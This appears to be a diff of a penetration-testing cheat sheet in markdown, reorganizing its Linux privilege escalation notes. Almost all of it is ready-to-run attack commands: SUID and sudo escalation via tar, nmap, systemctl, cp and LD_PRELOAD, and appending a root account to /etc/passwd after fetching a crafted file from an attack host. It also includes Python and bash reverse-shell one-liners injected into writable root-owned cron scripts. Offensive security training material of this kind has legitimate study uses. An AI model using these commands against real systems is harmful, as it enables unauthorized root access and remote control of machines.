@@ -545,6 +545,8 @@ If somehow you need to use a **DSS** private key instead of a **RSA** private ke
 
 ## Privilege Escalation | Linux
 
+SUDO & SUID tricks: 
+
 If possible always check sudo rights first:
 
 ```
@@ -556,8 +558,6 @@ Execute allowed sudo binary for a user other than ``root`` user:
 ```
 # sudo -u <USERNAME> <BINARY>
 ```
-
-##
 
 Sudo ``LD_PRELOAD`` Privilege Escalation:
 
@@ -591,8 +591,6 @@ Run the exploit:
 # sudo LD_PRELOAD=/home/<USER>/shell.so apache2
 ```
 
-##
-
 Check SUID allowed binaries:
 
 ```
@@ -609,15 +607,45 @@ If ``/bin/bash`` binary has SUID bit set and if you can find a private SSH key, 
 # ssh -i id_rsa <USER>@<RHOST> bash -p
 ```
 
-##
-
-TAR SUID:
+``tar`` SUID:
 
 ```
 # sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
+Don't forget to take a look on SUID bit set ``nmap`` binary:
+
+```
+# nmap --interactive
+# !sh
+```
+
+``systemctl`` SUID:
+
+```
+# TF=$(mktemp).service
+# echo '[Service]
+# Type=oneshot
+# ExecStart=/bin/sh -c "id > /tmp/output"
+# [Install]
+# WantedBy=multi-user.target' > $TF
+# systemctl link $TF
+# systemctl enable --now $TF
+```
+
+``cp`` SUID:
+
+```
+# openssl passwd -1 -salt <NEW_USER> <PASS>             <- Attack Box
+# cp /etc/passwd /outputfile                            <- Attack Box
+# python -m SimpleHTTPServer <LPORT>                    <- Attack Box
+# cd /tmp && wget http://<LHOST>:<LPORT>/passwd         <- Target Box
+# cp passwd /etc/passwd                                 <- Target Box
+# su <NEW_USER>                                         <- Target Box
+```
 ##
+
+Bash tricks:
 
 Find files containing specific string:
 
@@ -631,39 +659,18 @@ Find all files belonging to a specific user:
 # find / -user <USER> -type f 2>>/dev/null
 ```
 
-##
-
-Always check CRONJOBS:
+Find writable files in ``root`` directories:
 
 ```
-# /etc/cron*
-# /etc/init.d
-# /etc/crontab                <- System wide cron job
-# /etc/cron.allow
-# /etc/cron.d
-# /etc/cron.daily
-# /etc/cron.hourly
-# /etc/cron.monthly
-# /etc/cron.weekly
-# /var/spool/cron             <- User crontabs
-# /var/spool/cron/crontabs    <- User crontabs
+# find / -writable -type f 2>/dev/null
+# find /etc -maxdepth 1 -writable -type f
 ```
 
-If there's a writable root-owned script, ``.py``, ``.sh``, etc:
-
-Python one-liner reverse shell:
+Find all readable files:
 
 ```
-# echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> <FILE>.py
+# find /etc -maxdepth 1 -readable -type f
 ```
-
-Bash one-liner reverse shell:
-
-```
-# echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f" >> <FILE>.sh
-```
-
-##
 
 Always check ``history`` and ``.bash_history``:
 
@@ -691,15 +698,25 @@ or
 
 Execution Flow Hijacking:
 
+Get current environment variables:
+
+```
+# print $PATH
+```
+
+Hijack:
+
 ```
 # export PATH=<PATH_TO_YOUR_BINARY>:$PATH
 ```
 
-Always check MySQL version *(if applicable)* for **RAPTOR** exploit:
+Writable ``/etc/passwd`` file:
 
 ```
-# mysql -V
+# openssl passwd -1 -salt <USERNAME> <PASSWORD>                                        <- Attack Box
+# echo "<UESRNAME>:$1$<USERNAME>........../:0:0:/root/root:/bin/bash" >> /etc/passwd   <- Target Box (be aware of escape characters, bc echo might delete some chars)
 ```
+
 
 Check out possible kernel exploits:
 
@@ -788,6 +805,50 @@ For ``rbash``:
 Check out #1: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
 Check out #2: https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html
 Check out #3: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+
+##
+
+Cronjob tricks:
+
+Always check CRONJOBS:
+
+```
+# /etc/cron*
+# /etc/init.d
+# /etc/crontab                <- System wide cron job
+# /etc/cron.allow
+# /etc/cron.d
+# /etc/cron.daily
+# /etc/cron.hourly
+# /etc/cron.monthly
+# /etc/cron.weekly
+# /var/spool/cron             <- User crontabs
+# /var/spool/cron/crontabs    <- User crontabs
+```
+
+If there's a writable root-owned script, ``.py``, ``.sh``, etc:
+
+Python one-liner reverse shell:
+
+```
+# echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> <FILE>.py
+```
+
+Bash one-liner reverse shell:
+
+```
+# echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f" >> <FILE>.sh
+```
+
+##
+
+Always check MySQL version *(if applicable)* for **RAPTOR** exploit:
+
+```
+# mysql -V
+```
+
+
 
 
 
